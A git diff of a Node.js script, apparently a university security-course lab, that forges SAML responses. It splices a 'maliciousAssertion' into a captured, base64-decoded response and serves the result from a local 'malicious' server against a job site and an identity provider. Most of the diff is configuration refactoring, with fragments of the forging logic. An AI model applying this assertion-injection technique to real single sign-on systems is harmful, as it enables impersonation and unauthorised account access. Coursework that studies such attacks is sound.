@@ -8,16 +8,33 @@ var XMLWriter = require('xml-writer');
 var fs = require('fs');
 
 
-var malicious_url = 'http://localhost:8891';
+/**** WEB SERVER FUNCTIONS AND VARS ****/
+
+var malicious_root_url = 'http://localhost:8891';
 var MALICIOUS_PORT = 8891;
 
-var job_root_url = 'http://localhost:8889';
-var idp_root_url = 'http://localhost:8890';
+const JOB_PORT = 8889;
+const IDP_PORT = 8890;
+const JOB_SERVER_URL = "http://bmr-cs339.rhcloud.com";
+const IDP_URL = "http://idp-cs339.rhcloud.com";
+
+var job_root_url = '';
+var idp_root_url = '';
+
+var local = true;
+
+if(local){
+    job_root_url = "http://localhost:" + JOB_PORT;
+    idp_root_url = "http://localhost:" + IDP_PORT;
+}
+else {
+    job_root_url = JOB_SERVER_URL;
+    idp_root_url = IDP_URL;
+}
 
 
 
-var origSamlResponseBase64 = '';
-
+var maliciousResponse = '';
 
 
 /**
@@ -108,15 +125,13 @@ function alter_response(samlResponseBase64) {
     var secondHalf = samlResponse.substring(startIndex);
     var newResponse = firstHalf + maliciousAssertion + secondHalf;
 
-    //console.log(newResponse);
-
     //Encode
 	var newResponseBase64 = new Buffer(newResponse).toString('base64');
 	return newResponseBase64
 }
 
 function main() {
-    origSamlResponseBase64 = process.argv[2];
+    var origSamlResponseBase64 = process.argv[2];
 	maliciousResponse = alter_response(origSamlResponseBase64);
 
 	var server = http.createServer(request_handler);
